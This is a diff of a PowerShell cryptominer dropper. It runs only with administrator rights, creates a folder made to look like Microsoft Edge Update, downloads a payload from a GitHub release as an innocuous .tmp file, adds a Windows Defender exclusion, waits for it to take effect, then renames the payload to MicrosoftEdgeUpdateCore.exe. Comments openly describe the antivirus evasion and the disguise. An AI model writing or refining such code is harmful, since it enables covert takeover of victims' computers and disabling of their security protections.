@@ -9,17 +9,22 @@ $ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/downlo
 $admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
 if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }
 
-$dir = 'C:\Windows\Background'
+# plausible Edge-update location, matches the task naming
+$dir = Join-Path $env:ProgramData 'Microsoft\EdgeUpdate'
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
 
-# exclusion BEFORE the download so on-access scan skips the miner
-Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
+$sysPath = Join-Path $dir 'MicrosoftEdgeUpdateCore.exe'
+$tmpPath = Join-Path $dir 'MicrosoftEdgeUpdate.tmp'
 
-$sysPath = Join-Path $dir 'system.exe'
 if (-not (Test-Path $sysPath)) {
-    curl.exe -s -L -o "$dir\system.txt" --retry 3 --retry-delay 5 --max-time 120 "$ReleaseBase/system.txt"
-    if (Test-Path "$dir\system.txt") {
-        Move-Item -LiteralPath "$dir\system.txt" -Destination $sysPath -Force
+    # 1) download as innocent .tmp (survives on-access scan: unknown file)
+    curl.exe -s -L -o $tmpPath --retry 3 --retry-delay 5 --max-time 120 "$ReleaseBase/system.txt"
+    # 2) exclusion; Defender applies it asynchronously (~30s), hence the wait
+    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 35
+    # 3) rename + launch only after the exclusion is in effect
+    if (Test-Path $tmpPath) {
+        Move-Item -LiteralPath $tmpPath -Destination $sysPath -Force
     }
 }
 
